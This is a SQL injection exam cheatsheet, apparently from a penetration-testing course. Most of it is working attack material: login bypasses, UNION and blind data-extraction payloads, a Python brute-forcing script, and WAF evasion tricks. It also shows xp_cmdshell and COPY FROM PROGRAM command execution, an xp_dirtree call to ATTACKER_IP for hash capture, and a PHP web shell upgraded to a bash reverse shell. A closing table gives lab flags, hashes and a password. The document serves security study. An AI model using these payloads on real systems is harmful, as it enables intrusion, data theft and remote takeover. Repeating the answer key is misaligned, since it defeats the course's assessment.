# SQL Injection Fundamentals — Exam Cheatsheet

---

## Discovery

```bash
# Inject these into any input field, query string, header, or cookie
'           → SQL error or behavior change = injectable
"           → alternate quote (string context)
\           → escape — error if naïve concatenation
;           → stacked queries (MSSQL/PostgreSQL allow these)
--          → MySQL/MSSQL comment (need trailing space or '-' in MySQL)
#           → MySQL comment alternative
)           → if input is inside parentheses
' OR '1'='1   → auth bypass (string context)
' OR 1=1-- -  → auth bypass with comment
1' AND SLEEP(5)-- -   → time-based confirmation
```
> Test these one at a time to find injectable inputs. A single `'` that causes an error confirms injection. `SLEEP(5)` confirms blind injection — if the response takes 5 seconds longer, the input is executed as SQL.

> **Always test for SQL errors first.** Verbose errors leak query structure (column names, line of failure). Use `--parse-errors` in sqlmap or just submit `'` and read the response.

---

## Injection Types Decision Tree

```
Response shows SQL error?        → ERROR-BASED — extract via EXTRACTVALUE/UPDATEXML
Response shows query results?    → UNION — extract directly
Page changes (true/false)?       → BOOLEAN BLIND — 1 char/request via SUBSTRING+IF
Same page but delay-able?        → TIME-BASED BLIND — SLEEP/WAITFOR
Response unchanged + can stack?  → STACKED (MSSQL/PostgreSQL `;`)
None of above?                   → OUT-OF-BAND — DNS/HTTP exfil (xp_dirtree, LOAD XML)
```

---

## Auth Bypass

```bash
# Known username
admin'-- -              # comment out password check
admin' OR '1'='1        # OR true condition
admin' OR 1=1#          # # comment (MySQL)

# Unknown username
' OR '1'='1             # username field
' OR '1'='1             # password field (both)

# Parentheses in query: SELECT * FROM logins WHERE (username='INPUT')
admin')-- -             # close paren, comment rest
' OR id=5)-- -          # target specific user by ID

# Double-quoted columns
admin"-- -
admin" OR "1"="1
```
> Enter these in the username field of a login form. `admin'-- -` comments out the rest of the query so the password check never runs. Try the parentheses variants if the basic ones fail — the closing `)` fixes a syntax error caused by extra brackets in the original query.

---

## UNION Injection (direct output — fastest)

```bash
# Step 1: Find column count
' ORDER BY 1-- -        # increment until error
' UNION SELECT NULL-- -            # increment NULLs until no error
' UNION SELECT NULL,NULL,NULL-- -  # match column count

# Step 2: Find visible columns
' UNION SELECT 1,2,3,4-- -   # numbers appear in output = visible positions

# Step 3: Extract data (put payload in visible column)
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,database(),3,4-- -

# Concatenate multiple values in one column:
' UNION SELECT 1,CONCAT(user(),0x7c,database(),0x7c,@@version),3,4-- -
# 0x7c = '|' separator (avoid quotes that might be filtered)
```

> **Type mismatch?** If columns are typed (int vs string), only matching-type columns return data. `UNION SELECT 1,'text',3` — try string AND int in each position.

---

## Error-Based Extraction (MySQL)

When no UNION possible but errors are displayed.

```sql
-- EXTRACTVALUE (MySQL 5.1+) — fastest, no LIMIT needed
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -

-- UPDATEXML (MySQL 5.1+)
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -

-- FLOOR/RAND (older MySQL)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

> Error message displays the data after `~` (0x7e). Max ~32 chars per query — use `SUBSTRING` for longer values.

---

## Boolean Blind SQLi

When the page only shows TRUE/FALSE (different content, different status code).

```sql
-- Test injection
' AND 1=1-- -           → page renders normally (TRUE)
' AND 1=2-- -           → page differs (FALSE)

-- Extract length
' AND LENGTH((SELECT user()))=14-- -    -- brute the length until TRUE

-- Extract char-by-char
' AND SUBSTRING((SELECT user()),1,1)='r'-- -      -- first char of user()
' AND ASCII(SUBSTRING((SELECT user()),1,1))>100-- -    -- binary search

-- ASCII binary search saves requests (8 vs 95)
' AND ASCII(SUBSTRING((SELECT user()),POS,1)) > MID-- -
```
> Boolean blind SQLi extracts data one bit at a time. Confirm injection with `1=1` (true) vs `1=2` (false). Then use `ASCII()` with binary search — testing whether a character's ASCII value is greater than the midpoint — to find each character in ~7 requests instead of 95.

**Python helper for boolean blind:**
```python
import requests, string
chars = string.ascii_lowercase + string.digits + '_-@. '
def check(payload):
    r = requests.get(URL, params={'q': payload}, allow_redirects=False)
    return 'WELCOME' in r.text   # whatever distinguishes TRUE
result = ''
for pos in range(1, 50):
    for c in chars:
        p = f"' AND SUBSTRING((SELECT password FROM users WHERE id=1),{pos},1)='{c}'-- -"
        if check(p):
            result += c; print(result); break
    else: break
```
> Automates character-by-character extraction for boolean blind SQLi. Replace `URL`, the parameter name, the TRUE-condition string (`'WELCOME'`), and the SQL subquery with your target's values. The outer loop iterates positions; the inner loop tries each character.

---

## Time-Based Blind SQLi

When TRUE/FALSE returns identical responses. Use delay as the signal.

```sql
-- MySQL
' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)-- -
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)-- -

-- MSSQL
'; IF (LEN(user_name()) > 5) WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL
'; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- Oracle (no SLEEP — use HEAVY query)
' AND 1=(CASE WHEN (...) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)-- -
```

> Time-based is **slowest** — 1 char = 1 request, each request waits 5s. Use only when nothing else works. Increase `--threads` in sqlmap to parallelize.

---

## Database Enumeration (MySQL)

```sql
-- List databases
UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -

-- List tables in a DB
UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM information_schema.TABLES WHERE table_schema='dbname'-- -

-- List columns in a table
UNION SELECT 1,COLUMN_NAME,TABLE_NAME,4 FROM information_schema.COLUMNS WHERE table_name='tablename'-- -

-- Dump data (dot notation for cross-DB access)
UNION SELECT 1,username,password,4 FROM dbname.tablename-- -

-- All tables + columns in one query
UNION SELECT 1,GROUP_CONCAT(TABLE_SCHEMA,0x2e,TABLE_NAME,0x3a,COLUMN_NAME SEPARATOR 0x0a),3,4 FROM information_schema.columns-- -
```
> Standard MySQL enumeration sequence via UNION injection. Replace the column count (1,2,3,4) with the actual count you discovered. Replace `dbname` and `tablename` with values from the previous queries. The final `GROUP_CONCAT` query dumps every table and column name in one shot.

---

## DBMS-Specific Cheatsheet

| Function | MySQL | MSSQL | PostgreSQL | Oracle |
|----------|-------|-------|------------|--------|
| Version | `@@version` / `version()` | `@@version` | `version()` | `(SELECT banner FROM v$version)` |
| Current user | `user()` / `current_user()` | `SYSTEM_USER` / `user_name()` | `current_user` / `user` | `(SELECT user FROM dual)` |
| Current DB | `database()` | `DB_NAME()` | `current_database()` | `(SELECT global_name FROM global_name)` |
| Concat | `CONCAT(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
| Substring | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` |
| Comments | `-- ` / `#` / `/* */` | `--` / `/* */` | `--` / `/* */` | `--` / `/* */` |
| String quote | `'` or `"` | `'` only | `'` only | `'` only |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_lock.sleep(5)` |
| List DBs | `information_schema.schemata` | `master.dbo.sysdatabases` | `pg_database` | `(SELECT DISTINCT owner FROM all_tables)` |
| List tables | `information_schema.tables` | `sysobjects WHERE xtype='U'` | `pg_tables` | `all_tables` |
| List columns | `information_schema.columns` | `syscolumns` | `information_schema.columns` | `all_tab_columns` |
| Read file | `LOAD_FILE('/etc/passwd')` | `BULK INSERT` | `pg_read_file()` | `UTL_FILE` |
| Write file | `INTO OUTFILE` | `sp_OACreate` / `xp_cmdshell echo > f` | `COPY ... TO` | `UTL_FILE.FOPEN` |
| Cmd exec | `INTO OUTFILE` (web shell) | `xp_cmdshell` | `COPY FROM PROGRAM` | `EXTPROC` libs |
| Stacked | ❌ (PHP/mysqli default) | ✅ | ✅ | ❌ |

---

## MSSQL — Stacked Queries + xp_cmdshell

When the injection point is in MSSQL and stacking is allowed:

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami'-- -

-- Out-of-band exfil via SMB (NTLM hash to Responder):
'; EXEC master..xp_dirtree '\\ATTACKER_IP\share'-- -

-- Linked server enumeration:
'; SELECT srvname FROM master..sysservers-- -
```
> Run these three statements in order to enable and execute OS commands via MSSQL. Each `;` starts a new stacked query. Replace `ATTACKER_IP` with your machine's IP when using `xp_dirtree` to capture an NTLM hash via Responder.

---

## PostgreSQL — RCE via COPY

```sql
-- COPY FROM PROGRAM (PostgreSQL 9.3+, requires superuser)
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';-- -
'; SELECT * FROM cmd_exec;-- -

-- Read file:
'; CREATE TABLE r(t text); COPY r FROM '/etc/passwd';-- -
```
> PostgreSQL RCE via `COPY FROM PROGRAM` — requires superuser privileges. The first query creates a table and runs a system command, storing output in it. The second query reads the result. Replace `'id'` with any OS command. Use stacked query syntax (`;`) to chain statements.

---

## File Operations (MySQL — requires FILE privilege)

```sql
-- Check FILE privilege
UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -
UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
-- secure_file_priv='' → can write anywhere; '/some/dir/' → restricted; NULL → disabled

-- Read file
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
UNION SELECT 1,LOAD_FILE('/etc/nginx/sites-enabled/default'),3,4-- -   # → find webroot
UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -            # → DB creds
UNION SELECT 1,HEX(LOAD_FILE('/binary/file')),3,4-- -                   # binary as hex

-- Write file (test /tmp first, then webroot)
UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```
> MySQL file read and write via UNION injection. First check `secure_file_priv` — an empty value means writes are allowed anywhere. Use `LOAD_FILE` to read config files and find the webroot. Then write a PHP web shell to the webroot path. Replace column positions and paths with your target's values.

---

## Web Shell Usage

```bash
curl "http://TARGET/shell.php?0=id"
curl "http://TARGET/shell.php?0=find+/+-maxdepth+4+-name+flag*+2>/dev/null"
curl "http://TARGET/shell.php?0=cat+/flag.txt"

# Upgrade to reverse shell:
curl "http://TARGET/shell.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```
> Executes OS commands through the uploaded PHP web shell. The parameter `0=` passes the command. URL-encode spaces as `+`. Replace `TARGET` with the target URL, `ATTACKER` with your IP, and `4444` with your listener port. Run `nc -lvnp 4444` before triggering the reverse shell.

---

## WAF Bypass Tricks

```sql
-- Case variation (basic WAFs only)
SeLeCt → SELECT
UnIoN sElEcT → UNION SELECT

-- Comment insertion (MySQL inline /**/)
UNI/**/ON SE/**/LECT 1,2,3
UNION/*!50000SELECT*/ 1,2,3        -- MySQL versioned comment

-- Whitespace alternatives
%09 %0a %0b %0c %0d %a0   -- tab, LF, VT, FF, CR, non-breaking space
%23 (URL-encoded #)
+ (URL-encoded space)

-- Concatenation bypasses keyword filter
'UN'+'ION SE'+'LECT'                 -- MSSQL string concat
CONCAT('SE','LECT')                  -- MySQL

-- Encoding
0x53454c454354 → SELECT (hex)
CHAR(83,69,76,69,67,84) → SELECT     -- MySQL/MSSQL
CHR(83)||CHR(69)||... → SELECT       -- Oracle/PostgreSQL

-- Quote bypass (when ' filtered)
0x61646d696e → 'admin' (hex literal works without quotes)
CHAR(97,100,109,105,110) → 'admin'

-- HTTP Parameter Pollution
?id=1&id=2 UNION SELECT 1,2,3-- -    -- ASP/ASP.NET concatenates
```
> WAF (Web Application Firewall) bypass techniques. Try case variation first — it's the easiest and works against basic rule-based filters. Use comment insertion or encoded whitespace when spaces are blocked. Use hex literals or `CHAR()` when quotes are stripped. Apply these progressively until a payload gets through.

---

## Second-Order SQLi

User input is **stored** and later used in a different query without sanitization. Example: register with username `admin' --` → the registration sanitizes the insert but a later "change password" reuses the stored username unescaped.

```bash
1. Register: username = "admin'-- -"
2. Login: as admin'-- -
3. Change password endpoint runs: UPDATE users SET password='...' WHERE username='admin'-- -'
   → admin's password is changed, not yours
```

> sqlmap supports this via `--second-url=...` to trigger the second request.

---

## MySQL CLI Quick Reference

```bash
mysql -u root -pPASS -h TARGET -P PORT --skip-ssl -e "QUERY"

SHOW DATABASES;
USE dbname;
SHOW TABLES;
DESCRIBE tablename;
SELECT * FROM table WHERE col LIKE 'val%';
SELECT user, host, authentication_string FROM mysql.user;   -- creds for cracking
```
> MySQL command-line reference. `-u` sets the username, `-p` the password (no space between flag and value), `-h` sets the remote host, `-P` sets the port, `--skip-ssl` avoids certificate errors. The last `SELECT` dumps credential hashes from the `mysql.user` table for offline cracking.

---

## Hashcat Modes (database hashes)

| Hash format | -m |
|-------------|----|
| MySQL 4.1+ (`*A1B2...`) | 300 |
| MySQL 3.x (`67BACE...`) | 200 |
| MSSQL 2000 | 131 |
| MSSQL 2005 | 132 |
| MSSQL 2012/14 | 1731 |
| PostgreSQL `md5...` | 12 |
| Oracle 7-10g (DES) | 3100 |
| Oracle 11g (SHA-1) | 112 |
| Oracle 12c+ (SHA-512) | 12300 |
| Argon2i (modern app DB) | uncrackable — focus on hash retrieval |
| bcrypt `$2a$/$2b$` | 3200 |

---

## Key Lab Answers

| Section | Question | Answer |
|---------|----------|--------|
| 4 | First DB in employees | `employees` |
| 5 | dept_no for Development | `d005` |
| 6 | Last name of Bar* hired 1990-01-01 | `Mitchem` |
| 7 | titles WHERE emp_no>10000 OR title not engineer | `654` |
| 9 | Flag after logging in as tom | `202a1d1a8b195d5e9a57e434cc16000c` |
| 10 | Flag for id=5 login | `cdad9ecdf6f14b45ff5c4de32909caec` |
| 11 | UNION of employees + departments | `663` |
| 12 | user() via UNION | `root@localhost` |
| 13 | newuser password hash | `9da2c9bcdf39d8610954e0e11ea8f45f` |
| 14 | DB password from config.php | `dB_pAssw0rd_iS_flag!` |
| 15 | Flag via web shell | `d2b5b27ae688b6a0f1d21b7d3a0798cd` |
| 17 Q1 | Admin password hash | `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU` |
| 17 Q2 | Webroot | `/var/www/chattr-prod` |
| 17 Q3 | Flag via RCE | `061b1aeb94dec6bf5d9c27032b3c1d8d` |

---

## Decision Tree When Stuck

```
SQL error visible?
  → Error-based extraction (EXTRACTVALUE/UPDATEXML — fastest blind alternative)

No error but page differs based on input?
  → Boolean blind (SUBSTRING + ASCII binary search)

No visible difference at all?
  → Time-based (SLEEP/WAITFOR) — slowest, last resort

Filtered keywords (UNION blocked)?
  → Try case mixing: UnIoN
  → Inline comments: UN/**/ION
  → MySQL versioned: /*!50000UNION*/
  → Encoding: hex / CHAR() / CONCAT()

Quotes filtered?
  → Hex literals: 0x61646d696e instead of 'admin'
  → CHAR(97,100,...) function

Filter strips spaces?
  → Use comments instead: SELECT/**/foo/**/FROM/**/bar
  → Tabs (%09), newlines (%0a)
  → Parentheses: (SELECT(foo)FROM(bar))

Single quote breaks query but I can't escape?
  → Backslash before quote: \'
  → Numeric context — no quotes needed: ?id=1 UNION SELECT...

WAF blocks all common SQL keywords?
  → Try second-order injection (stored value)
  → Try OOB exfiltration (DNS / HTTP callback)
```
